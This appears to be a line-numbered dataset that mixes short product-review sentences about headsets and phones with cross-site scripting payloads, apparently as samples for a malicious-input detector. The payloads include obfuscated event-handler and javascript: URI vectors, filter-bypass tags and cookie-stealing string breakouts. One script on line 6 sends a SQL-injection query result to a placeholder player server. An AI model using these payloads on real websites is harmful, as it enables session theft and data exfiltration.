0	Talk about USELESS customer service.
1	Its well-designed and very sharp -- the blue is a very nice color.
2	It fits my ear well and is comfortable on.
3	&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;
4	<AudIo coNTRoLs autoPLAy ONenDEd=ALerT(1)><SourcE SRC="VaLIdAudiO.Wav" type="AUdIO/Wav"></auDIO>
5	The biggest complaint I have is, the battery drains superfast.
6	<SCRIPT>FETCH('HTTP://X-ORACLE-V0.NN9ED.KA0LABS.ORG/ADMIN/SEARCH/X%27%20UNION%20SELECT%20FLAG%20FROM%20CHALLENGE%23').THEN(_=>_.TEXT()).THEN(_=>NEW IMAGE().SRC='HTTP://PLAYER_SERVER/?'+_)</SCRIPT>
7	&lt;table&gt;&lt;td background=\"javascript&#058;alert('xss')\"&gt;
8	‘; ALERT(DOCUMENT.COOKIE); VAR FOO=’
9	<AUdIo auTOPLay ONPLAyiNg=aLErt(1)><SOuRCe sRc="VALIDaUDiO.WAV" tyPE="AUDio/wAV"></auDIo>
10	Also difficult to put on.I'd recommend avoiding this product.
11	<A ID=X TABINDEX=1 ONFOCUSIN=ALERT(1)></A>
12	Very Dissapointing Performance.
13	<SCR<SCRIPT>IPT>ALERT(DOCUMENT.COOKIE)</SCR</SCRIPT>IPT>
14	My experience was terrible..... This was my fourth bluetooth headset, and while it was much more comfortable than my last Jabra (which I HATED!!!
15	FOO\’; ALERT(DOCUMENT.COOKIE);//’;
16	<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">
17	<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3a;&#97lert(1)>clickme
18	lightweight and works well.
19	Battery is terrible.
20	foo\’; alert(document.cookie);//’;
21	The phone can also take great pictures and even video clips.
22	<BODY ONLOAD=alert('hellox worldss')>
23	Phone is sturdy as all nokia bar phones are.
24	I like design and look of Jabra behing the ear headsets and 52 is pretty comfortible to wear 24 hours a day without pain in the ear.
25	<iframe/src=javascript:alert(1)>
26	&lt;body onload=alert('xss')&gt;
27	And none of the tones is acceptable.
28	&lt;IMg lowsrC=\"jAVaSCriPt&#058;aLErT('xss')\"&gt;
29	However, BT headsets are currently not good for real time games like first-person shooters since the audio delay messes me up.
30	<table background="javascript:alert('xss')">
31	javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mh`//'>
32	It is well made, easy to access the phone and has a handy, detachable belt clip.
33	<iFRAme/Src=jaVAscRIpT:ALErt(1)>
34	<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">
35	Obviously they have a terrible customer service, so you get what you pay for.
36	//<FORM/ACTION=JAVASCRIPT&#X3A;ALERT&LPAR;DOCUMENT&PERIOD;COOKIE&RPAR;><INPUT/TYPE='SUBMIT'>//
37	Poor Construction.
38	Works well.
